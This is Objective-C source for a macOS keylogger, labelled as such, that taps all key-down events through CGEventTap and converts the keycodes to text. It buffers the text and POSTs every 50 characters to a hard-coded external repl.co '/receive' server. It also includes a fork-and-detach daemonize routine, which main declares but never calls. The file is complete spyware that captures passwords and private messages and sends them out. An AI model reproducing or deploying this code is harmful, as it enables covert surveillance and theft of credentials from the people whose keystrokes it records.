//  keylogger
//  Created by alx on 1/29/24.
//  Last updated 1/30/24.

#import <Foundation/Foundation.h>
#import <Cocoa/Cocoa.h>
#import <Carbon/Carbon.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#import "objectivemap.h"
//string to upload to server
NSString *output = @"";

//keyboard event converter
CGEventRef keyboardEvent(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    //need event key
    CGKeyCode key = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    //convert and store string, url encoding
    NSString *s = [map convert:key];
    s = [s stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]];
    output = [output stringByAppendingString:s];
    if([output length] >= 50) {
        s = output;
        output = @"";
        //url + sending data
        NSURL *URL = [NSURL URLWithString:@"https://b51b6613-6ce0-4e52-9c70-1a80b7690bc8-00-3pubhbmtjo3wn.picard.repl.co/receive"];
        NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:URL];
        [request setHTTPMethod:@"POST"];
        [request setValue:@"text/plain" forHTTPHeaderField:@"Content-Type"];
        NSData *send = [s dataUsingEncoding:NSUTF8StringEncoding];
        [request setHTTPBody:send];
        NSURLSessionConfiguration *config = [NSURLSessionConfiguration defaultSessionConfiguration];
        NSURLSession *session = [NSURLSession sessionWithConfiguration:config];
        //server error
        NSURLSessionDataTask *task = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
            if (error) {
                NSLog(@"ES: %@", [error localizedDescription]);
            } else {
                NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
                if (httpResponse.statusCode == 200) {
                    NSLog(@"DS.");
                } else {
                    NSLog(@"SE: %ld", (long)httpResponse.statusCode);
                }
            }
        }];
        [task resume];
    }
    return event;
}

void daemonize(void) {
    pid_t pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }
    if (setsid() < 0) {
        exit(EXIT_FAILURE);
    }
    umask(0);
    chdir("/");
}

//main
int main(int argc, const char * argv[]) {
    //daemonize
    void daemonize(void);
    //resource management
    @autoreleasepool {
        //create event tap
        CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap,
                                                  kCGHeadInsertEventTap,
                                                  0,
                                                  CGEventMaskBit(kCGEventKeyDown),
                                                  keyboardEvent,
                                                  NULL);
        //error message
        if (!eventTap) {
            NSLog(@"couldn't tap, try again");
            exit(1);
        }
        //run loop
        CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
        CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
        CGEventTapEnable(eventTap, true);
        CFRunLoopRun();
        CFRelease(runLoopSource);
        CFRelease(eventTap);
    }
    return 0;
}
